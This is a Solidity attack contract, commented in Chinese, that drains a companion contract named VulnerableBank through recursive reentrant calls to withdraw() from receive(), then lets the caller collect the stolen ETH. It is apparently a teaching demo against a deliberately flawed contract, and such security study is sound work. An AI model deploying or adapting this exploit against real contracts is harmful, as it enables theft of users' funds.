// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./VulnerableBank.sol";

/**
 * @title ReentrancyAttack
 * @notice 针对 VulnerableBank 的重入攻击合约
 * @dev 攻击流程：
 *      1. 调用 attack() 存入少量 ETH 并立即提款
 *      2. 银行合约向本合约转账时触发 receive()
 *      3. receive() 中再次调用 withdraw()，形成递归重入
 *      4. 直到银行合约余额不足才停止
 */
contract ReentrancyAttack {
    VulnerableBank public bank;

    constructor(address _bank) {
        bank = VulnerableBank(_bank);
    }

    /// @notice 发起攻击：先存款再触发重入
    function attack() public payable {
        require(msg.value > 0, "Need ETH to attack");
        bank.deposit{value: msg.value}();
        bank.withdraw();
    }

    /// @notice 接收 ETH 时递归调用 withdraw，实现重入
    receive() external payable {
        if (address(bank).balance >= msg.value) {
            bank.withdraw();
        }
    }

    /// @notice 攻击者取回窃取的资金
    function collect() public {
        payable(msg.sender).transfer(address(this).balance);
    }

    /// @notice 查看攻击合约余额
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
